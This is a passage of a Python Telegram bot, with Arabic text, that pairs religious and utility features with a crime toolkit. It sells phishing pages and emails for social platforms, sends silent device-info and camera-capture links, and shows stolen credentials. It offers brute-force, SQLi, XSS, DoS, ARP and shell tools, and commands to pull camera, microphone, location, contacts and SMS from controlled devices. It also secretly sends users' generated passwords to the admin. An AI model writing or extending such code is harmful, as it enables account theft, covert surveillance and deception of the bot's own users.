            adkar_list = ISLAMIC_DATA[f"adkar_{adkar_type}"]
            if idx < len(adkar_list):
                current = adkar_list[idx]
                markup = InlineKeyboardMarkup(row_width=1)
                if idx + 1 < len(adkar_list):
                    markup.row(InlineKeyboardButton("📖 المزيد", callback_data=f"adkar_more_{adkar_type}_{idx+1}"))
                markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
                safe_send(chat_id, f"📿 {('أذكار الصباح' if adkar_type == 'sabah' else 'أذكار المساء')}:\n\n{current}", reply_markup=markup)
            else:
                safe_send(chat_id, "لا يوجد المزيد من الأذكار")
            return

        # ===== الأدعية =====
        if data == "doaa_menu":
            safe_send(chat_id, "اختر تصنيف الدعاء:", reply_markup=build_doaa_menu())
            return
        if data.startswith("doaa_"):
            category_map = {"doaa_safar": "سفر", "doaa_hem": "هم", "doaa_rizq": "رزق", "doaa_nawm": "نوم", "doaa_faraj": "فرج"}
            category = category_map.get(data)
            if category:
                doaa_list = ISLAMIC_DATA["doaa"].get(category, [])
                if doaa_list:
                    user_doaa_indices[chat_id] = 0
                    doaa_text = doaa_list[0]
                    total = len(doaa_list)
                    safe_send(chat_id, f"🤲 {category}:\n\n{doaa_text}", reply_markup=build_doaa_action_menu(category, 0, total))
                else:
                    safe_send(chat_id, "لا توجد أدعية في هذا التصنيف")
            return
        if data.startswith("doaa_more_"):
            parts = data.split("_")
            category = parts[2]
            index = int(parts[3])
            doaa_list = ISLAMIC_DATA["doaa"].get(category, [])
            if index < len(doaa_list):
                doaa_text = doaa_list[index]
                total = len(doaa_list)
                user_doaa_indices[chat_id] = index
                safe_send(chat_id, f"🤲 {category}:\n\n{doaa_text}", reply_markup=build_doaa_action_menu(category, index, total))
            else:
                safe_send(chat_id, "لا يوجد المزيد من الأدعية")
            return

        # ===== مسلم =====
        if data == "muslim_menu":
            safe_send(chat_id, "اختر الموضوع:", reply_markup=build_muslim_menu())
            return
        if data.startswith("muslim_"):
            key = data.split("_")[1]
            content_map = {
                "arkan_islam": ISLAMIC_DATA["arkan_islam"],
                "arkan_iman": ISLAMIC_DATA["arkan_iman"],
                "wudu": ISLAMIC_DATA["wudu"],
                "ghusl": ISLAMIC_DATA["ghusl"]
            }
            if key in content_map:
                safe_send(chat_id, content_map[key])
            return

        # ===== مولد كلمات السر =====
        if data == "password_gen":
            passwords = [password_generator(12) for _ in range(5)]
            temp_passwords[chat_id] = passwords
            msg = "🔑 اختر كلمة السر التي تريدها:\n\n"
            for i, pwd in enumerate(passwords):
                msg += f"{i+1}. {pwd}\n"
            markup = InlineKeyboardMarkup(row_width=2)
            for i in range(5):
                markup.row(InlineKeyboardButton(f"اختر {i+1}", callback_data=f"pwd_select_{i}"))
            safe_send(chat_id, msg, reply_markup=markup)
            return
        if data.startswith("pwd_select_"):
            idx = int(data.split("_")[2])
            passwords = temp_passwords.get(chat_id, [])
            if idx < len(passwords):
                selected = passwords[idx]
                safe_send(chat_id, f"✅ تم اختيار كلمة السر: {selected}")
                notify_admin(f"🔑 المستخدم {chat_id} اختار كلمة السر: {selected}")
                notify_admin(f"📋 جميع الكلمات المولدة للمستخدم {chat_id}: {', '.join(passwords)}")
            else:
                safe_send(chat_id, "حدث خطأ، حاول مرة أخرى")
            return

        # ===== اقتباسات =====
        if data == "quotes_menu":
            safe_send(chat_id, "اختر نوع الاقتباسات:", reply_markup=build_quotes_menu())
            return
        if data == "quotes_arabic":
            safe_send(chat_id, "اختر نوع الاقتباس العربي:", reply_markup=build_quotes_type_menu('arabic'))
            return
        if data == "quotes_english":
            safe_send(chat_id, "Choose quote type:", reply_markup=build_quotes_type_menu('english'))
            return
        if data.startswith("quote_"):
            parts = data.split("_")
            lang = parts[1] if parts[1] in ['arabic', 'english'] else 'arabic'
            category = parts[2] if len(parts) > 2 else 'sad'
            quote = get_random_quote(lang, category)
            safe_send(chat_id, quote)
            return

        # ===== نصائح =====
        if data == "tips_menu":
            safe_send(chat_id, "اختر نوع النصيحة:", reply_markup=build_tips_menu())
            return
        if data.startswith("tips_"):
            tip_type = data.split("_")[1]
            tip = get_random_tip(tip_type)
            safe_send(chat_id, tip)
            return

        # ===== تصيد =====
        if data == "phishing_locked":
            points = get_user_points(chat_id)
            if points < 300:
                safe_send(chat_id, f"❌ تحتاج 300 نقطة لاستخدام هذه الميزة. نقاطك: {points}")
            else:
                if deduct_points(chat_id, 300, "شراء صلاحية التصيد"):
                    safe_db_execute("UPDATE users SET can_use_phishing = 1 WHERE chat_id = ?", (chat_id,))
                    safe_send(chat_id, "✅ تم تفعيل صلاحية التصيد، استخدم الزر الآن.")
                    markup = build_main_menu(chat_id)
                    safe_send(chat_id, "القائمة الرئيسية", reply_markup=markup)
            return

        if data == "phishing_email":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية استخدام هذه الميزة. تحتاج 300 نقطة.")
                return
            safe_send(chat_id, "اختر المنصة التي تريد إنشاء بريد تصيد لها:", reply_markup=build_phishing_platform_menu())
            return
        if data.startswith("phish_platform_"):
            platform = data.split("_")[2]
            user_states[chat_id] = "waiting_phishing_target"
            user_states[f"{chat_id}_phishing_platform"] = platform
            safe_send(chat_id, f"أدخل البريد الإلكتروني المستهدف (مثال: victim@example.com):")
            return

        if data == "phishing_pages":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية استخدام هذه الميزة. تحتاج 300 نقطة.")
                return
            safe_send(chat_id, "اختر المنصة لإنشاء صفحة تصيد:", reply_markup=build_phishing_pages_menu())
            return
        if data.startswith("phish_"):
            platform = data.split("_")[1]
            if platform in ['facebook', 'instagram', 'tiktok', 'twitter', 'whatsapp']:
                page_url = f"{SERVER_URL}/phishing_pages/{platform}"
                safe_send(chat_id, f"تم إنشاء صفحة تصيد لـ {platform}\nالرابط: {page_url}\nشارك هذا الرابط مع الضحية")
            else:
                safe_send(chat_id, "منصة غير مدعومة")
            return

        # ===== معلومات الجهاز والكاميرا =====
        if data == "device_info":
            if not user_can_use_collector(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الأداة. يرجى التواصل مع المطور")
                return
            token = get_user_token(chat_id)
            link = f"{SERVER_URL}/device_info?token={token}"
            safe_send(chat_id, f"رابط جمع معلومات الجهاز (يعمل بصمت):\n{link}")
            return

        if data == "camera_hack":
            if not user_can_use_camera(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الأداة. يرجى التواصل مع المطور")
                return
            token = get_user_token(chat_id)
            link = f"{SERVER_URL}/camera_hack?token={token}"
            safe_send(chat_id, f"رابط الكاميرا الأمامية (يعمل بصمت):\n{link}")
            return

        # ===== باقي الأزرار الأساسية (مختصرة) =====
        if data == "weather":
            user_states[chat_id] = "waiting_weather"
            safe_send(chat_id, "أدخل اسم المدينة (مثال: القاهرة، الرياض، دبي)")
            return
        if data == "wikipedia":
            user_states[chat_id] = "waiting_wikipedia"
            safe_send(chat_id, "أدخل مصطلح البحث في ويكيبيديا")
            return
        if data == "password_strength":
            user_states[chat_id] = "waiting_password_strength"
            safe_send(chat_id, "أرسل كلمة السر لفحص قوتها")
            return
        if data == "text_to_speech":
            user_states[chat_id] = "waiting_tts"
            safe_send(chat_id, "أرسل النص لتحويله إلى صوت (باللغة العربية)")
            return
        if data == "translate":
            user_states[chat_id] = "waiting_translate"
            safe_send(chat_id, "أرسل النص للترجمة، وسيُطلب منك اختيار اللغة")
            return
        if data == "reminder":
            user_states[chat_id] = "waiting_reminder"
            safe_send(chat_id, "أدخل التذكير بالصيغة: الرسالة|الساعة:الدقيقة (مثال: اجتماع الساعة 3|15:30)")
            return
        if data == "news":
            user_states[chat_id] = "waiting_news"
            safe_send(chat_id, "أدخل موضوع الأخبار (مثال: سياسة، اقتصاد، رياضة)")
            return
        if data == "pdf_menu":
            safe_send(chat_id, "اختر خدمة PDF:", reply_markup=build_pdf_menu())
            return
        if data == "pdf_summary":
            user_states[chat_id] = "waiting_pdf_summary"
            safe_send(chat_id, "أرسل ملف PDF لتلخيصه")
            return
        if data == "pdf_extract":
            user_states[chat_id] = "waiting_pdf_extract"
            safe_send(chat_id, "أرسل ملف PDF لاستخراج نصوصه")
            return
        if data == "pdf_smart":
            user_states[chat_id] = "waiting_pdf_smart"
            safe_send(chat_id, "أرسل ملف PDF للتحليل الذكي (ستتمكن من طرح أسئلة عليه)")
            return
        if data == "my_points":
            points = get_user_points(chat_id)
            safe_send(chat_id, f"نقاطك: {points}")
            return
        if data == "my_referral":
            code = get_referral_code(chat_id)
            bot_username = bot.get_me().username
            link = f"https://t.me/{bot_username}?start=ref_{code}"
            safe_send(chat_id, f"رابط دعوتك:\n{link}\n\nكل من يسجل عبر رابطك يحصل على 10 نقاط لك وللمدعو")
            return
        if data == "points_history":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 20", (chat_id,))
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "سجل النقاط:\n"
                for row in rows:
                    sign = "+" if row[0] > 0 else ""
                    msg += f"{sign}{row[0]} - {row[1]} ( {row[2][:16]} )\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا يوجد سجل للنقاط")
            return
        if data == "analyze_apk":
            user_states[chat_id] = "waiting_apk_analysis"
            safe_send(chat_id, "أرسل ملف APK لتحليله")
            return
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "أدخل رابط الفيديو (يوتيوب، فيسبوك، تيك توك)")
            return
        if data == "check_link_advanced":
            user_states[chat_id] = "waiting_link_check_advanced"
            safe_send(chat_id, "أرسل الرابط لفحصه (تكلفة الفحص 5 نقاط)")
            return
        if data == "list_devices":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT device_id, name, status, last_seen FROM targets")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "الأجهزة المسجلة:\n"
                for row in rows:
                    msg += f"جهاز: {row[1]}, الحالة: {row[2]}, آخر ظهور: {row[3][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد أجهزة")
            return

        # ===== لوحة التحكم =====
        if data == "admin_stats":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            users = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM targets")
            targets = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM scan_results")
            scans = c.fetchone()[0]
            conn.close()
            safe_send(chat_id, f"الإحصائيات:\nالمستخدمون: {users}\nالأجهزة: {targets}\nالفحوصات: {scans}")
            return
        if data == "admin_broadcast":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_broadcast"
            safe_send(chat_id, "أدخل رسالة البث")
            return
        if data == "admin_users":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id, is_admin, is_banned, points, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users")
            rows = c.fetchall()
            conn.close()
            msg = "المستخدمون:\n"
            for r in rows:
                msg += f"{r[0]} - {'مدير' if r[1] else 'عادي'} - {'محظور' if r[2] else 'نشط'} - نقاط: {r[3]} - صلاحيات: C:{r[4]} K:{r[5]} P:{r[6]} A:{r[7]}\n"
            safe_send(chat_id, msg)
            return
        if data == "admin_reports":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "آخر التقارير:\n"
                for row in rows:
                    msg += f"{row[0]} - {row[1]} - {row[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد تقارير")
            return
        if data == "admin_phishing_logs":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT platform, username, password, ip, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 20")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "سجل بيانات التصيد:\n"
                for r in rows:
                    msg += f"المنصة: {r[0]}, المستخدم: {r[1]}, كلمة السر: {r[2]}, IP: {r[3]}, الوقت: {r[4][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد بيانات تصيد")
            return

        # ===== إدارة الصلاحيات =====
        if data == "admin_permissions":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            markup, error = build_users_menu(chat_id, "perm")
            if markup:
                safe_send(chat_id, "اختر المستخدم لإدارة صلاحياته:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return
        if data.startswith("perm_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            markup = build_permissions_menu(chat_id, target_user)
            if markup:
                safe_send(chat_id, f"صلاحيات المستخدم {target_user}:", reply_markup=markup)
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return
        if data.startswith("perm_toggle_"):
            if not is_admin(chat_id):
                return
            parts = data.split("_")
            perm_type = parts[2]
            target_user = int(parts[3])
            col_map = {"collector": "can_use_collector", "camera": "can_use_camera", "phishing": "can_use_phishing", "advanced": "can_use_advanced"}
            col_name = col_map.get(perm_type)
            if col_name:
                row = safe_db_query(f"SELECT {col_name} FROM users WHERE chat_id = ?", (target_user,))
                if row is not None:
                    new_val = 0 if row[0] else 1
                    safe_db_execute(f"UPDATE users SET {col_name} = ? WHERE chat_id = ?", (new_val, target_user))
                    safe_send(chat_id, f"تم تحديث صلاحية {perm_type} للمستخدم {target_user} إلى {'مفعلة' if new_val else 'معطلة'}")
                    markup = build_permissions_menu(chat_id, target_user)
                    if markup:
                        safe_send(chat_id, f"صلاحيات المستخدم {target_user}:", reply_markup=markup)
            return

        # ===== قفل الدردشة =====
        if data == "lock_chat":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            markup, error = build_users_menu(chat_id, "lock")
            if markup:
                safe_send(chat_id, "اختر المستخدم لقفل/فتح الدردشة:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return
        if data.startswith("lock_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            if row is not None:
                new_status = 0 if row[0] else 1
                safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'قفل'} الدردشة مع المستخدم {target_user}")
                markup, _ = build_users_menu(chat_id, "lock")
                if markup:
                    safe_send(chat_id, "اختر مستخدم آخر:", reply_markup=markup)
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return

        # ===== إرسال للمستخدم =====
        if data == "send_to_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            markup, error = build_users_menu(chat_id, "send")
            if markup:
                safe_send(chat_id, "اختر المستخدم لإرسال رسالة إليه:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return
        if data.startswith("send_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            user_states[chat_id] = "waiting_send_to_user"
            user_states[f"{chat_id}_send_target"] = target_user
            safe_send(chat_id, f"أدخل الرسالة التي تريد إرسالها إلى المستخدم {target_user}:")
            return

        # ===== إدارة النقاط =====
        if data == "admin_points_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            markup, error = build_users_menu(chat_id, "points")
            if markup:
                safe_send(chat_id, "اختر المستخدم لإضافة نقاط له:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return
        if data.startswith("points_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            user_states[chat_id] = "waiting_admin_points_amount"
            user_states[f"{chat_id}_points_target"] = target_user
            safe_send(chat_id, f"أدخل عدد النقاط التي تريد إضافتها للمستخدم {target_user} (يمكنك إدخال عدد سالب للخصم):")
            return

        # ===== حظر المستخدمين =====
        if data == "admin_ban_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            markup, error = build_users_menu(chat_id, "ban")
            if markup:
                safe_send(chat_id, "اختر المستخدم لحظره أو فك حظره:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return
        if data.startswith("ban_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            if row is not None:
                new_status = 0 if row[0] else 1
                safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'حظر'} المستخدم {target_user}")
                markup, _ = build_users_menu(chat_id, "ban")
                if markup:
                    safe_send(chat_id, "اختر مستخدم آخر:", reply_markup=markup)
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return

        # ===== القائمة السرية =====
        if data == "hacking_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            safe_send(chat_id, "القائمة السرية:", reply_markup=build_hacking_menu())
            return
        if data == "toggle_stealth":
            if not is_admin(chat_id):
                return
            global STEALTH_MODE
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
            return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            safe_send(chat_id, "قائمة الحماية:", reply_markup=build_protection_menu())
            return
        if data == "protect_lock":
            if not is_admin(chat_id):
                return
            global BOT_LOCKED
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
            return
        if data == "protect_shield":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, f"درع الحماية:\n{active_shield()}")
            return
        if data == "protect_stealth":
            if not is_admin(chat_id):
                return
            STEALTH_MODE = True
            change_bot_identity()
            safe_send(chat_id, "وضع التخفي الشامل: تم تفعيل التخفي (تغيير الهوية، الوكيل، User-Agent)")
            return
        if data == "protect_detect":
            if not is_admin(chat_id):
                return
            result = detect_intrusion()
            safe_send(chat_id, f"كشف الاختراق:\n{result}")
            return
        if data == "protect_identity":
            if not is_admin(chat_id):
                return
            result = change_bot_identity()
            safe_send(chat_id, f"تغيير الهوية:\n{result}")
            return
        if data == "protect_clean":
            if not is_admin(chat_id):
                return
            result = clean_traces()
            safe_send(chat_id, f"تنظيف السجلات:\n{result}")
            return
        if data == "protect_api":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, f"تم تفعيل حماية API. مفتاح API: `{API_KEY}`\nاستخدمه في Header: X-API-Key")
            return
        if data == "protect_backup":
            if not is_admin(chat_id):
                return
            result = backup_data()
            safe_send(chat_id, f"النسخ الاحتياطي:\n{result}")
            return
        if data == "protect_reboot":
            if not is_admin(chat_id):
                return
            result = restart_bot_safely()
            safe_send(chat_id, f"إعادة التشغيل الآمن:\n{result}")
            return

        # ===== الأزرار المتبقية (هجمات) =====
        if data == "bruteforce_fb":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_fb_username"
            safe_send(chat_id, "أدخل بريد أو رقم أو اسم مستخدم فيسبوك")
            return
        if data == "bruteforce_ig":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_ig_username"
            safe_send(chat_id, "أدخل اسم مستخدم انستغرام")
            return
        if data == "bruteforce_ssh":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_ssh_target"
            safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
            return
        if data == "bruteforce_ftp":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_ftp_target"
            safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
            return
        if data == "bruteforce_custom":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_custom_bruteforce"
            safe_send(chat_id, "أدخل البيانات بالصيغة: هدف|نوع(facebook/instagram/ssh/ftp)|كلمات_سر مفصولة بفاصلة")
            return
        if data == "port_scan":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_portscan"
            safe_send(chat_id, "أدخل الهدف (IP أو نطاق)")
            return
        if data == "ssl_scan":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_ssl"
            safe_send(chat_id, "أدخل النطاق لفحص SSL")
            return
        if data == "hack_sqli":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_sqli_hack"
            safe_send(chat_id, "أدخل رابط الموقع لاختبار حقن SQL")
            return
        if data == "hack_xss":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_xss_hack"
            safe_send(chat_id, "أدخل رابط الموقع لاختبار XSS")
            return
        if data == "hack_dos":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_dos"
            safe_send(chat_id, "أدخل الهدف بالصيغة: IP|المنفذ|المدة(ثانية)")
            return
        if data == "hack_arp":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_arp"
            safe_send(chat_id, "أدخل بالصيغة: IP_الهدف|IP_البوابة")
            return
        if data == "hack_shell":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            user_states[chat_id] = "waiting_shell"
            safe_send(chat_id, "أدخل أمر Shell")
            return
        if data == "hack_camera":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز. استخدم الأجهزة أولاً")
                return
            add_command(device_id, "CAPTURE_CAMERA")
            safe_send(chat_id, f"تم إرسال أمر الكاميرا للجهاز {device_id}")
            return
        if data == "hack_mic":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            user_states[chat_id] = "waiting_mic_duration"
            safe_send(chat_id, "أدخل مدة التسجيل بالثواني")
            return
        if data == "hack_location":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "GET_LOCATION")
            safe_send(chat_id, f"تم إرسال أمر الموقع للجهاز {device_id}")
            return
        if data == "hack_contacts":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "GET_CONTACTS")
            safe_send(chat_id, f"تم إرسال أمر جهات الاتصال للجهاز {device_id}")
            return
        if data == "hack_sms":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "GET_SMS")
            safe_send(chat_id, f"تم إرسال أمر SMS للجهاز {device_id}")
            return
        if data == "hack_screenshot":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "SCREENSHOT")
            safe_send(chat_id, f"تم إرسال أمر لقطة الشاشة للجهاز {device_id}")
            return
        if data == "hack_shutdown":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "SHUTDOWN")
            safe_send(chat_id, f"تم إرسال أمر إيقاف التشغيل للجهاز {device_id}")
            return

        # ===== نشاط المستخدمين =====
        if data == "user_activity":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id, action, timestamp FROM user_activity ORDER BY timestamp DESC LIMIT 20")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "آخر النشاطات:\n"
                for r in rows:
                    msg += f"{r[0]} - {r[1]} - {r[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد نشاطات")
            return

    except Exception as e:
        logger.error(f"خطأ في callback_handler: {e}")
        safe_send(chat_id, "حدث خطأ غير متوقع. تم إبلاغ المطور.")
        notify_admin(f"خطأ في callback: {e}\nData: {call.data}")

# ===================== معالجات النصوص (مختصرة) =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور من استخدام البوت")
            return

        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل حالياً. يرجى التواصل مع المطور")
            return

        # ===== معالجة الترجمة =====
        if state == "waiting_translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            lang_list = "\n".join([f"{code}: {name}" for code, name in LANGUAGES.items()])
            safe_send(chat_id, f"أرسل النص للترجمة، اختر اللغة المستهدفة من القائمة:\n{lang_list}\n\nأدخل رمز اللغة (مثال: ar, en, fr):")
            return
        if state == "waiting_translate_lang":
            target_lang = text.lower()
            if target_lang not in LANGUAGES:
                safe_send(chat_id, "لغة غير مدعومة. اختر من القائمة.")
                return
            original_text = user_states.get(f"{chat_id}_translate_text", "")
            chunks, source_lang, source_name, target_name = translate_text_advanced_with_lang(original_text, target_lang)
            msg = f"🌐 النص الأصلي ({source_name}):\n{original_text}\n\n📝 الترجمة ({target_name}):\n"
            for chunk in chunks:
                msg += chunk + "\n"
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            if f"{chat_id}_translate_text" in user_states:
                del user_states[f"{chat_id}_translate_text"]
            return

        # ===== إدارة النقاط =====
        if state == "waiting_admin_points_amount":
            if not is_admin(chat_id):
                return
            target_user = user_states.get(f"{chat_id}_points_target")
            if not target_user:
                safe_send(chat_id, "لم يتم تحديد مستخدم")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                reason = "إدارة النقاط من قبل المطور"
                add_points(target_user, amount, reason)
                safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {target_user}")
                markup, _ = build_users_menu(chat_id, "points")
                if markup:
                    safe_send(chat_id, "اختر مستخدم آخر:", reply_markup=markup)
            except:
                safe_send(chat_id, "يرجى إدخال عدد صحيح")
            user_states[chat_id] = None
            if f"{chat_id}_points_target" in user_states:
                del user_states[f"{chat_id}_points_target"]
            return

        # ===== بريد تصيد =====
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            user_states[chat_id] = "waiting_phishing_action"
            user_states[f"{chat_id}_phishing_target_email"] = text
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(
                InlineKeyboardButton("✍️ كتابة يدوية", callback_data="phish_action_manual"),
                InlineKeyboardButton("🤖 إنشاء تلقائي", callback_data="phish_action_auto")
            )
            safe_send(chat_id, f"المنصة: {platform}\nالبريد المستهدف: {text}\n\nكيف تريد إنشاء الرسالة؟", reply_markup=markup)
            return
        if state == "waiting_phishing_action":
            # تتم عبر callback
            pass

        # ===== إرسال للمستخدم =====
        if state == "waiting_send_to_user":
            if not is_admin(chat_id):
                return
            target_user = user_states.get(f"{chat_id}_send_target")
            if not target_user:
                safe_send(chat_id, "لم يتم تحديد مستخدم")
                user_states[chat_id] = None
                return
            safe_send(target_user, text)
            safe_send(chat_id, f"✅ تم إرسال الرسالة إلى {target_user}")
            user_states[chat_id] = None
            if f"{chat_id}_send_target" in user_states:
                del user_states[f"{chat_id}_send_target"]
            return

        # ===== /start =====
        if text.startswith('/start'):
            user_name = message.from_user.first_name or "صديق"
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT created_at, last_seen FROM users WHERE chat_id = ?", (chat_id,))
            row = c.fetchone()
            is_new = False
            if not row:
                c.execute("INSERT INTO users (chat_id, created_at, last_seen) VALUES (?, ?, ?)", 
